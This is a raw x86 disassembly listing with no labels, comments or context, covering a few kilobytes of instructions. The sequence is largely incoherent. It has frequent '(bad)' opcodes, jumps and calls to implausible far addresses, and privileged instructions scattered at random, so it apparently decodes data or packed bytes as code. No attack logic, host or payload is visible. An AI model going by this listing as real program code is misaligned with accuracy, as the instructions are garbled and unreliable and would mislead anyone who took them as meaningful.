  432b4e:	add    BYTE PTR [ebx],ch
  432b50:	inc    ebp
  432b51:	data16 (bad) 
  432b53:	clc    
  432b54:	int3   
  432b55:	cmp    eax,DWORD PTR [eax]
  432b57:	je     0x432ae2
  432b59:	push   0xffffffc8
  432b5b:	pop    edi
  432b5c:	xchg   DWORD PTR [ebp+0x0],eax
  432b5f:	data16 add BYTE PTR [ebp+0x45],cl
  432b63:	lea    cx,[ebp+0x10]
  432b67:	jb     0x432b69
  432b69:	jmp    0x432af4
  432b6b:	call   eax
  432b6d:	clc    
  432b6e:	xchg   DWORD PTR [edi+0x1],edi
  432b71:	mov    eax,DWORD PTR [eax]
  432b73:	or     BYTE PTR [ebp-0x49],al
  432b76:	lea    eax,[eax+0x74003154]
  432b7c:	push   edi
  432b7d:	inc    edx
  432b7e:	jge    0x432b7f
  432b80:	mov    DWORD PTR [edi],ecx
  432b82:	fdiv   DWORD PTR [edi-0x6]
  432b85:	inc    DWORD PTR [eax]
  432b87:	xor    edx,DWORD PTR [eax+0x5f]
  432b8a:	xchg   DWORD PTR [ebx+0x1],ebx
  432b8d:	ret    0x0
  432b90:	xor    BYTE PTR [ebp-0x51],cl
  432b93:	cmp    edi,0xf0ff89fe
  432b99:	data16 ror al,0x84
  432b9d:	rol    BYTE PTR [eax],0x3b
  432ba0:	add    al,dh
  432ba2:	dec    eax
  432ba3:	xchg   esp,eax
  432ba4:	push   ebx
  432ba5:	jmp    0x432b32
  432ba7:	push   ebp
  432ba8:	add    esp,ebp
  432baa:	add    ebp,esp
  432bac:	mov    edx,DWORD PTR [edi+0x24]
  432baf:	clc    
  432bb0:	dec    esi
  432bb1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432bb7:	cmp    BYTE PTR [ebx],al
  432bb9:	jne    0x432b44
  432bbb:	xor    esp,eax
  432bbd:	jmp    0x462d40
  432bc2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bc5:	jne    0x432bbb
  432bc7:	call   0xffcd2921
  432bcc:	clc    
  432bcd:	xchg   edi,eax
  432bce:	sti    
  432bcf:	add    DWORD PTR [ebx],eax
  432bd1:	add    BYTE PTR [ebp+0x47],bl
  432bd4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bda:	pop    ebp
  432bdb:	mov    DWORD PTR [esi-0x48],esi
  432bde:	jmp    0x432c27
  432be0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432be6:	(bad)  
  432be8:	cmp    al,0x0
  432bea:	cmp    eax,DWORD PTR [ebp+0x18]
  432bed:	lea    ebx,[ebp-0x56]
  432bf0:	jle    0x432bf2
  432bf2:	jae    0x432b7d
  432bf4:	mov    eax,esp
  432bf6:	call   0xb900:0x8b005587
  432bfd:	inc    ebp
  432bfe:	push   ebp
  432bff:	lea    ecx,[ebp-0x27ff4f12]
  432c05:	mov    eax,edi
  432c07:	int3   
  432c08:	push   ebp
  432c09:	xchg   edi,eax
  432c0b:	add    esp,ebp
  432c0d:	add    BYTE PTR [eax],al
  432c0f:	inc    ebp
  432c10:	add    BYTE PTR [ebp+0x8b3255],cl
  432c16:	cld    
  432c17:	mov    DWORD PTR [edx],edi
  432c19:	aam    0x75
  432c1b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c21:	mov    DWORD PTR [ebx-0x50],edx
  432c24:	test   BYTE PTR [ebp-0x1],0xe8
  432c28:	mov    eax,DWORD PTR [eax]
  432c2a:	hlt    
  432c2b:	add    al,al
  432c2d:	mov    eax,DWORD PTR ds:0x890045a8
  432c33:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c39:	inc    DWORD PTR [eax*2+0xf75854d]
  432c40:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c46:	call   0x72998987
  432c4b:	je     0x432cab
  432c4d:	js     0x432cae
  432c4f:	lock ret 0x7e
  432c53:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c59:	mov    edi,edi
  432c5b:	sbb    al,bl
  432c5d:	clc    
  432c5e:	add    BYTE PTR [ebp-0x73],bh
  432c61:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c67:	ror    BYTE PTR [eax],1
  432c69:	dec    ebp
  432c6a:	xchg   ebp,eax
  432c6b:	mov    edi,edi
  432c6d:	in     al,0x8b
  432c6f:	jge    0x432bfa
  432c71:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c77:	clc    
  432c78:	pop    esi
  432c79:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c7f:	clc    
  432c80:	add    al,0x6e
  432c82:	mov    eax,DWORD PTR [ebx]
  432c84:	mov    BYTE PTR [ebp+0x0],dl
  432c87:	mov    edx,DWORD PTR [ebx-0x20]
  432c8a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c90:	add    eax,0x3b3b73
  432c95:	adc    al,0x89
  432c97:	pop    eax
  432c98:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c9c:	ret    0xf08
  432c9f:	cmp    al,0x2
  432ca1:	mov    edx,eax
  432ca3:	cld    
  432ca4:	add    BYTE PTR [ebp+0x66],dl
  432ca7:	add    eax,ebx
  432ca9:	add    esp,eax
  432cab:	sub    eax,eax
  432cad:	or     BYTE PTR [ecx-0x77f474bb],cl
  432cb3:	add    BYTE PTR [eax],al
  432cb5:	mov    DWORD PTR [ebx-0x24],ebx
  432cb8:	push   edi
  432cb9:	push   ebp
  432cba:	clc    
  432cbb:	add    DWORD PTR [esi+0x1b0100],0x45
  432cc2:	out    0xff,eax
  432cc4:	add    edx,DWORD PTR [eax]
  432cc6:	jmp    0x432cb0
  432cc8:	cmp    ch,0x46
  432ccb:	(bad)  
  432ccc:	jmp    0x40c8b51e
  432cd1:	je     0x432c5d
  432cd3:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cd9:	inc    ebp
  432cda:	add    BYTE PTR [ebx-0x770375],al
  432ce0:	add    ah,ch
  432ce2:	add    edx,esp
  432ce4:	pop    edi
  432ce5:	pop    ebp
  432ce6:	push   ebp
  432ce7:	inc    ebx
  432ce8:	in     al,dx
  432ce9:	pop    ebp
  432cea:	in     al,dx
  432ceb:	cmp    edx,DWORD PTR [edi-0x8]
  432cee:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432cf5:	add    al,0x47
  432cf7:	push   ebp
  432cf8:	mov    esp,ebp
  432cfa:	in     al,0x45
  432cfc:	dec    ebp
  432cfd:	push   esi
  432cfe:	test   DWORD PTR [eax+0xfb010f],esi
  432d04:	add    BYTE PTR [eax+0xc018b],dh
  432d0a:	leave  
  432d0b:	inc    ebp
  432d0c:	test   al,ch
  432d0e:	add    dh,bh
  432d10:	add    bh,bh
  432d12:	dec    ebp
  432d13:	push   cs
  432d14:	mov    DWORD PTR [ecx],eax
  432d16:	hlt    
  432d17:	push   es
  432d18:	dec    ebp
  432d19:	leave  
  432d1a:	mov    DWORD PTR [eax],ecx
  432d1c:	clc    
  432d1d:	cmovge eax,ecx
  432d20:	mov    ecx,0x85c2f0
  432d26:	clc    
  432d27:	pop    DWORD PTR [ebp+0x1]
  432d2a:	push   ebx
  432d2b:	add    BYTE PTR [ebp-0x15],bh
  432d2e:	push   esi
  432d2f:	xor    eax,0x898a45
  432d34:	cld    
  432d35:	add    al,BYTE PTR [ebp+0x0]
  432d38:	xor    esp,DWORD PTR [esi-0x64]
  432d3b:	add    DWORD PTR [esi+0x78308c1],edi
  432d41:	add    ah,BYTE PTR [ebp-0x49]
  432d44:	int    0xbb
  432d46:	mov    ecx,DWORD PTR [esi+0xc]
  432d49:	add    dh,al
  432d4b:	cmp    ecx,ebx
  432d4d:	jne    0x432d17
  432d4f:	xor    ecx,DWORD PTR [ebp+0x66]
  432d52:	jmp    0xca2d58
  432d57:	add    DWORD PTR [ebp+0x0],eax
  432d5a:	mov    eax,ebx
  432d5c:	or     al,0x8b
  432d5e:	(bad)  
  432d5f:	mov    ecx,esi
  432d61:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d68:	mov    eax,edi
  432d6a:	or     BYTE PTR [edx],cl
  432d6c:	shl    cl,cl
  432d6e:	icebp  
  432d6f:	add    BYTE PTR [ebp+0x38],0x8b
  432d73:	or     BYTE PTR [edx+eax*2],cl
  432d76:	(bad)  
  432d77:	or     cl,dh
  432d79:	stc    
  432d7a:	shl    DWORD PTR [ebp-0x30],0xc6
  432d7e:	xor    al,0x0
  432d80:	inc    ebp
  432d81:	xchg   BYTE PTR [ebx],al
  432d83:	add    esp,edi
  432d85:	add    BYTE PTR [ebp-0x39],cl
  432d88:	mov    al,bl
  432d8a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d90:	sub    al,0xbf
  432d92:	jmp    0x432d19
  432d94:	mov    edi,eax
  432d96:	lock jge 0x432d8a
  432d99:	lea    esi,[edx-0x74bad5ff]
  432d9f:	mov    ebp,esp
  432da1:	or     cl,dh
  432da3:	leave  
  432da4:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432dab:	dec    ebp
  432dac:	dec    ebp
  432dad:	test   DWORD PTR [ebx],eax
  432daf:	paddb  mm6,mm0
  432db2:	add    DWORD PTR [eax],eax
  432db4:	dec    ebp
  432db5:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432dbb:	mov    esi,DWORD PTR [edx]
  432dbd:	or     al,0x2b
  432dbf:	dec    ebp
  432dc0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432dc6:	mov    esp,edi
  432dc8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dcf:	mov    DWORD PTR [ebx],ebp
  432dd1:	call   0xc76b701
  432dd6:	mov    DWORD PTR [ebp+0x10],ecx
  432dd9:	(bad)  
  432dda:	push   0x8b85ff10
  432ddf:	clc    
  432de0:	or     al,0x54
  432de2:	(bad)  
  432de3:	push   ecx
  432de4:	retf   
  432de5:	mov    ebx,0xff4d8dc8
  432dea:	mov    DWORD PTR [ebp+0x8],eax
  432ded:	xor    eax,DWORD PTR [ebp-0x75]
  432df0:	cmp    ebp,DWORD PTR [ebx]
  432df2:	lsl    ebx,WORD PTR [edi-0x8]
  432df6:	call   DWORD PTR [ebx-0x741bff75]
  432dfc:	(bad)  
  432dfd:	or     al,0x5b
  432dff:	dec    ebp
  432e00:	or     BYTE PTR [ebx],dh
  432e02:	inc    ebp
  432e03:	xor    esi,DWORD PTR ds:0x708088d
  432e09:	in     eax,0x9b
  432e0b:	add    BYTE PTR [edx],dh
  432e0d:	inc    ebp
  432e0e:	pop    edi
  432e0f:	xor    eax,edx
  432e11:	test   DWORD PTR [eax],0x81108b8b
  432e17:	dec    ebp
  432e18:	sub    al,0x33
  432e1a:	add    BYTE PTR [ebx],dh
  432e1c:	push   esi
  432e1d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e23:	mov    edi,eax
  432e25:	or     BYTE PTR [ebp+0x45],al
  432e28:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e2e:	xor    ecx,ecx
  432e30:	pushf  
  432e31:	push   es
  432e32:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e39:	dec    ebp
  432e3a:	inc    ebp
  432e3b:	cmp    BYTE PTR [ecx],0x54
  432e3e:	pushf  
  432e3f:	gs (bad) 
  432e41:	shl    esp,1
  432e43:	dec    ebp
  432e44:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e4a:	shr    ecx,1
  432e4c:	xlat   BYTE PTR ds:[ebx]
  432e4d:	rol    bh,cl
  432e4f:	mov    edx,esp
  432e51:	or     BYTE PTR [ebp+0x4588f84d],al
  432e57:	mov    ecx,DWORD PTR [eax]
  432e59:	or     BYTE PTR [eax],al
  432e5b:	push   ebp
  432e5c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e62:	dec    ebp
  432e63:	enter  0xceba,0x8
  432e67:	retf   0x1807
  432e6a:	ret    0x9b4d
  432e6d:	mov    esi,DWORD PTR [edx]
  432e6f:	or     al,0x33
  432e71:	into   
  432e72:	add    edx,esi
  432e74:	add    ecx,edx
  432e76:	bswap  eax
  432e78:	ror    esi,0x98
  432e7b:	dec    ebp
  432e7c:	add    cl,ch
  432e7e:	mov    edi,edi
  432e80:	hlt    
  432e81:	inc    esi
  432e83:	inc    ebp
  432e84:	ret    0x4533
  432e87:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e8d:	or     BYTE PTR [ebx],dh
  432e8f:	dec    ebp
  432e90:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e96:	jne    0xff8d2e5d
  432e9c:	inc    ebp
  432e9d:	inc    ebp
  432e9e:	mov    esi,DWORD PTR [ebx]
  432ea0:	clc    
  432ea1:	pop    esi
  432ea2:	ret    0xcaeb
  432ea5:	mov    eax,esi
  432ea7:	call   0x5204837a
  432eac:	dec    ebp
  432ead:	add    eax,0xf8728b
  432eb2:	adc    eax,0xce0ccac9
  432eb7:	push   ebp
  432eb8:	ret    0xc6ec
  432ebb:	in     al,dx
  432ebc:	call   0x33437bc5
  432ec1:	push   edi
  432ec2:	add    edi,eax
  432ec4:	xor    eax,eax
  432ec6:	jmp    0x432f0d
  432ec8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432ece:	add    eax,edi
  432ed0:	shr    eax,cl
  432ed2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ed8:	mov    esi,DWORD PTR [edx]
  432eda:	in     al,dx
  432edb:	pushf  
  432edc:	ret    0x84c7
  432edf:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ee5:	inc    ebp
  432ee6:	in     al,dx
  432ee7:	xor    DWORD PTR [ebp-0x64],eax
  432eea:	mov    eax,edi
  432eec:	cld    
  432eed:	fmul   st(2),st
  432eef:	sbb    dl,al
  432ef1:	jmp    0x9c3b:0x304d45c1
  432ef8:	jbe    0x432ec1
  432efa:	mov    esp,eax
  432efc:	clc    
  432efd:	add    BYTE PTR [ebp+0x0],cl
  432f00:	mov    ecx,ecx
  432f02:	lea    eax,[ebp-0x5]
  432f05:	mov    edi,edi
  432f07:	call   0x51ce8351
  432f0c:	hlt    
  432f0d:	xor    eax,edx
  432f0f:	mov    esi,0x9b7284
  432f14:	xor    cl,dl
  432f16:	mov    esi,eax
  432f18:	hlt    
  432f19:	into   
  432f1a:	inc    ebp
  432f1b:	scas   eax,DWORD PTR es:[edi]
  432f1c:	mov    ebp,ecx
  432f1e:	cld    
  432f1f:	add    dl,cl
  432f21:	add    dl,al
  432f23:	inc    ebp
  432f24:	shr    DWORD PTR [ebx],0x4d
  432f27:	xor    edi,DWORD PTR [ebx]
  432f29:	mov    DWORD PTR [edi],ecx
  432f2b:	clc    
  432f2c:	dec    esi
  432f2d:	inc    ebp
  432f2e:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f34:	ret    0xc6ca
  432f37:	mov    BYTE PTR [ebp-0x32],0x53
  432f3b:	scas   eax,DWORD PTR es:[edi]
  432f3c:	inc    ebp
  432f3d:	jmp    0x432f6f
  432f3f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f46:	pop    ebx
  432f47:	xor    ecx,DWORD PTR [ebp+0x3]
  432f4a:	mov    eax,DWORD PTR [ebx]
  432f4c:	clc    
  432f4d:	test   edx,ecx
  432f4f:	mov    ecx,esi
  432f51:	cld    
  432f52:	call   0x8ab7749c
  432f57:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f5d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f63:	fdiv   QWORD PTR [ebx]
  432f65:	retf   0xce89
  432f68:	in     al,0xc1
  432f6a:	inc    ebp
  432f6b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f71:	into   
  432f72:	mov    dh,0xc1
  432f75:	call   0x8c1774fe
  432f7a:	(bad)  
  432f7b:	cld    
  432f7c:	mov    ecx,DWORD PTR [ebp-0x14]
  432f7f:	xor    eax,ecx
  432f81:	lea    eax,[ebp+0x8]
  432f84:	mov    esi,DWORD PTR [edx-0x4]
  432f87:	add    dl,al
  432f89:	inc    ebp
  432f8a:	mov    esp,0x32d89b8b
  432f8f:	dec    ebp
  432f90:	mov    esi,DWORD PTR [ebx]
  432f92:	cld    
  432f93:	xor    eax,edx
  432f95:	sub    esp,DWORD PTR [ebp-0x75]
  432f98:	int    0xec
  432f9a:	sub    ecx,eax
  432f9c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432fa2:	mov    esi,esp
  432fa4:	call   0x34177d2d
  432fa9:	inc    DWORD PTR [ebx]
  432fab:	mov    edi,DWORD PTR [ebx]
  432fad:	cld    
  432fae:	jne    0x432ffd
  432fb0:	mov    esi,DWORD PTR [ebx]
  432fb2:	aam    0x8d
  432fb4:	dec    ebp
  432fb5:	or     BYTE PTR [ebx],dh
  432fb7:	jb     0x432fbc
  432fb9:	add    BYTE PTR [edi+0x45],bl
  432fbc:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432fc3:	xor    ebp,esp
  432fc5:	xor    eax,edi
  432fc7:	sub    edi,esp
  432fc9:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fcf:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fd6:	inc    ebp
  432fd7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fdd:	clc    
  432fde:	mov    eax,edi
  432fe0:	nop
  432fe1:	fadd   QWORD PTR [eax]
  432fe3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fe9:	jmp    0x432f74
  432feb:	mov    eax,DWORD PTR [ecx]
  432fed:	fadd   DWORD PTR [eax]
  432fef:	inc    ebp
  432ff0:	or     DWORD PTR [ebx],esi
  432ff2:	dec    eax
  432ff3:	add    edx,DWORD PTR [ebx-0x2d]
  432ff6:	dec    ebp
  432ff7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432ffd:	inc    ebp
  432ffe:	push   esp
  432fff:	mov    dl,BYTE PTR [ecx-0xd]
  433002:	xor    ecx,DWORD PTR [ebp-0x45]
  433005:	(bad)  
  433007:	rol    BYTE PTR [eax],0xc1
  43300a:	ret    
  43300b:	inc    ebp
  43300c:	inc    ebp
  43300d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433013:	xor    eax,ebx
  433015:	add    eax,DWORD PTR [ebp+0x23]
  433018:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43301e:	cmp    edi,0xc
  433021:	dec    ebp
  433022:	inc    ebp
  433023:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433029:	inc    ebp
  43302a:	mov    esi,DWORD PTR [ebx]
  43302c:	clc    
  43302d:	lea    eax,[ebp+0x45725407]
  433033:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433037:	xor    edi,DWORD PTR [eax]
  433039:	mov    ecx,0xff8b8d4d
  43303e:	push   esp
  43303f:	enter  0x4df7,0x23
  433043:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433049:	mov    eax,DWORD PTR [ebx]
  43304b:	loopne 0x433038
  43304d:	ret    0xc68b
  433050:	push   esp
  433051:	enter  0x9745,0x8b
  433055:	inc    ebp
  433056:	cld    
  433057:	mov    eax,edi
  433059:	clc    
  43305a:	ret    
  43305b:	ret    0xc645
  43305e:	mov    esi,DWORD PTR [ebx]
  433060:	cld    
  433061:	pop    esi
  433062:	mov    ebx,0x83458bc3
  433068:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43306c:	dec    ebp
  43306d:	xor    DWORD PTR [ebx],esi
  43306f:	pushf  
  433070:	add    edi,DWORD PTR [edx-0x7767a77]
  433076:	fcom   DWORD PTR [ebp+0x45]
  433079:	mov    esi,DWORD PTR [ebx]
  43307b:	adc    al,0x9c
  43307d:	inc    ebp
  43307e:	(bad)  
  43307f:	mov    ebx,eax
  433081:	adc    al,0x85
  433083:	cmp    al,0x1
  433086:	inc    ebp
  433087:	add    BYTE PTR ds:0xe98b9c4d,bh
  43308d:	mov    eax,DWORD PTR [ebx]
  43308f:	nop
  433090:	add    BYTE PTR [eax],al
  433092:	inc    ebp
  433093:	mov    esi,DWORD PTR [ebx]
  433095:	add    eax,DWORD PTR [ebx]
  433097:	cmp    al,0x89
  433099:	mov    esp,esi
  43309b:	clc    
  43309c:	inc    ebp
  43309d:	inc    ebp
  43309e:	add    edx,DWORD PTR [esi+0xc]
  4330a1:	mov    edi,0x7ff0845
  4330a6:	in     al,dx
  4330a7:	(bad)  
  4330a8:	jne    0x433045
  4330aa:	mov    esi,DWORD PTR [edx]
  4330ac:	clc    
  4330ad:	add    ebp,DWORD PTR [esi]
  4330af:	mov    edi,edi
  4330b1:	in     al,dx
  4330b2:	mov    DWORD PTR [ebp-0x10],eax
  4330b5:	xor    eax,DWORD PTR [ebp+0x3]
  4330b8:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330be:	fmul   DWORD PTR [ebx-0x173caf39]
  4330c4:	lea    ecx,[ecx+0x45e8d4bc]
  4330ca:	clc    
  4330cb:	mov    edi,edi
  4330cd:	cmp    BYTE PTR [ebp+0x4d],al
  4330d0:	test   DWORD PTR [eax+0x74],ecx
  4330d3:	inc    ecx
  4330d4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330da:	ret    
  4330db:	inc    eax
  4330dc:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330e2:	push   eax
  4330e3:	dec    eax
  4330e4:	test   al,0xd0
  4330e6:	dec    eax
  4330e8:	mov    eax,DWORD PTR [ebp-0x14]
  4330eb:	mov    eax,DWORD PTR [ebp+0x38]
  4330ee:	mov    eax,ecx
  4330f0:	fadd   DWORD PTR [ebx]
  4330f2:	dec    ebp
  4330f3:	inc    eax
  4330f4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330fa:	inc    ebp
  4330fb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433101:	fadd   QWORD PTR [ebx]
  433103:	inc    ebp
  433104:	or     al,0x33
  433106:	dec    ebp
  433107:	add    edi,DWORD PTR [ebx]
  433109:	mov    DWORD PTR [edx-0x28],esi
  43310c:	mov    eax,DWORD PTR [ebp-0x10]
  43310f:	mov    eax,DWORD PTR [eax+0x10]
  433112:	mov    eax,edi
  433114:	lock ret 
  433116:	inc    ecx
  433117:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43311d:	fsubr  st,st(5)
  43311f:	test   DWORD PTR [eax],eax
  433121:	clc    
  433122:	push   0x45
  433124:	(bad)  
  433125:	cmp    al,0xec
  433127:	pushf  
  433128:	inc    ebp
  433129:	(bad)  
  43312a:	push   eax
  43312b:	fsub   DWORD PTR [eax-0x7b]
  43312e:	(bad)  
  43312f:	clc    
  433130:	mov    eax,0xf8008584
  433135:	mov    eax,DWORD PTR [ebp-0x4]
  433138:	mov    edi,0x4585c3cc
  43313e:	clc    
  43313f:	mov    eax,DWORD PTR [ebp+0x14]
  433142:	xor    eax,DWORD PTR [ebp-0x64]
  433145:	mov    edi,eax
  433147:	in     al,dx
  433148:	les    esi,FWORD PTR [ebp-0x7b]
  43314b:	mov    edi,eax
  43314d:	or     al,0x4d
  43314f:	dec    ebp
  433150:	mov    eax,ebp
  433152:	in     al,0xf2
  433154:	dec    ebp
  433155:	dec    DWORD PTR [ecx+0x4dc7e045]
  43315b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433161:	inc    ebp
  433162:	mov    DWORD PTR [ebx],esi
  433164:	fadd   QWORD PTR [ebx]
  433166:	dec    ebp
  433167:	push   eax
  433168:	xor    eax,DWORD PTR [ebp+0x3]
  43316b:	push   eax
  43316c:	mov    DWORD PTR [eax+ebx*8],ebx
  43316f:	push   esi
  433171:	mov    eax,DWORD PTR [eax]
  433173:	lock cmp eax,0xf84e85c0
  433179:	inc    ebp
  43317a:	test   BYTE PTR [ebx],dh
  43317c:	add    DWORD PTR [ebx],eax
  43317e:	add    BYTE PTR [eax+0x4d],dl
  433181:	jne    0x4331b6
  433183:	lea    ecx,[ebx-0x7617fc44]
  433189:	div    ah
  43318b:	inc    DWORD PTR [ebp+0x45]
  43318e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433194:	jb     0x433121
  433196:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43319d:	mov    ecx,DWORD PTR [ebp-0x10]
  4331a0:	xor    ecx,DWORD PTR [ebp+0x3]
  4331a3:	mov    edi,DWORD PTR [ebx]
  4331a5:	adc    BYTE PTR [ebp+0x41],dh
  4331a8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4331ae:	ret    
  4331af:	push   ss
  4331b0:	push   0x45
  4331b2:	lea    ecx,[ebx+0x4de80cb0]
  4331b8:	sti    
  4331b9:	add    edi,edi
  4331bb:	or     BYTE PTR [ebp+0x4d],al
  4331be:	mov    ebp,DWORD PTR [ebx]
  4331c0:	xor    ebp,ecx
  4331c2:	mov    al,BYTE PTR [edx]
  4331c4:	add    eax,0xc7200
  4331c9:	jne    0x433218
  4331cb:	lea    esi,[ebx]
  4331cd:	mov    al,0xf
  4331cf:	call   0xf2894
  4331d4:	shl    DWORD PTR [ecx],0x84
  4331d7:	pushf  
  4331d8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331de:	mov    esi,DWORD PTR [edx]
  4331e0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331e7:	test   DWORD PTR [eax],eax
  4331e9:	clc    
  4331ea:	dec    ebp
  4331eb:	inc    ebp
  4331ec:	xor    edi,DWORD PTR [edi+ecx*1]
  4331ef:	pushf  
  4331f0:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331f7:	lea    eax,[ecx]
  4331f9:	int3   
  4331fa:	add    BYTE PTR [ebp+0x45],cl
  4331fd:	lea    ecx,[ebx-0x75b2cc38]
  433203:	lea    eax,ds:0x4d72c4
  433209:	mov    ecx,DWORD PTR [ebp-0x4]
  43320c:	xor    ecx,edi
  43320e:	bswap  ebx
  433210:	ror    BYTE PTR [ebp-0x35],0xe9
  433214:	rol    DWORD PTR [ecx],0x84
  433217:	add    BYTE PTR [ecx],al
  433219:	xor    eax,DWORD PTR [eax]
  43321b:	pushf  
  43321c:	inc    ebp
  43321d:	jnp    0x8a436620
  433223:	mov    eax,DWORD PTR ds:0xcf72e8
  433229:	lock dec ebp
  43322b:	retf   
  43322c:	xor    ecx,DWORD PTR [ebp+0xf]
  43322f:	mov    eax,eax
  433231:	fmul   st,st(3)
  433233:	test   ecx,0x19b8484
  433239:	xor    al,BYTE PTR [eax]
  43323b:	mov    DWORD PTR [ebp-0x28],eax
  43323e:	mov    eax,DWORD PTR [ebp+0x33]
  433241:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433247:	ret    
  433248:	add    al,cl
  43324a:	dec    ebp
  43324b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433251:	add    ecx,DWORD PTR ds:0xc7250
  433257:	inc    ebp
  433258:	rcl    DWORD PTR [eax+0x4d],0x2b
  43325c:	mov    edi,edi
  43325e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433264:	jb     0x43322d
  433266:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  43326d:	mov    esi,DWORD PTR [ebx]
  43326f:	cld    
  433270:	mov    cl,bh
  433272:	or     eax,0x372b6
  433277:	cmp    ecx,eax
  433279:	jne    0x4332f6
  43327f:	mov    eax,DWORD PTR [ebp-0x20]
  433282:	mov    eax,DWORD PTR [eax]
  433284:	xor    eax,edi
  433286:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43328d:	mov    ecx,DWORD PTR [ebp-0x4]
  433290:	mov    ecx,edi
  433292:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433298:	jb     0x4332a9
  43329a:	add    BYTE PTR [edi-0x3f],dl
  43329d:	add    BYTE PTR [ebp-0x75],cl
  4332a0:	mov    esi,eax
  4332a2:	xor    eax,DWORD PTR [eax]
  4332a4:	mov    al,bh
  4332a6:	or     eax,0x4b7284
  4332ab:	xor    al,cl
  4332ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4332b0:	mov    ecx,edi
  4332b2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332b8:	jb     0x4332c9
  4332ba:	add    BYTE PTR [edi],dh
  4332bc:	enter  0x8500,0x8b
  4332c0:	add    ah,bl
  4332c2:	add    BYTE PTR [eax],al
  4332c4:	inc    ebp
  4332c5:	(bad)  
  4332c6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4332cd:	mov    esi,DWORD PTR [edx-0x4]
  4332d0:	add    bh,cl
  4332d2:	dec    ebp
  4332d3:	mov    dh,0x8b
  4332d5:	add    esi,DWORD PTR [ebx]
  4332d7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332dd:	add    BYTE PTR [eax],al
  4332df:	mov    eax,ecx
  4332e1:	loopne 0x433330
  4332e3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332e9:	dec    ebx
  4332ea:	or     eax,0x8b7232
  4332ef:	in     al,0xc1
  4332f1:	or     DWORD PTR [ebp-0x31],ecx
  4332f4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332fb:	xor    dh,BYTE PTR [edx-0x75]
  4332fe:	add    al,dh
  433300:	enter  0x4f09,0xcf
  433304:	inc    ebp
  433305:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43330b:	or     al,BYTE PTR ds:0xe4728b
  433311:	or     DWORD PTR [ebp-0x31],ecx
  433314:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43331b:	cmp    dh,BYTE PTR [edx+0xf]
  43331e:	add    bl,dl
  433320:	rol    DWORD PTR [eax],0x4d
  433323:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433329:	(bad)  
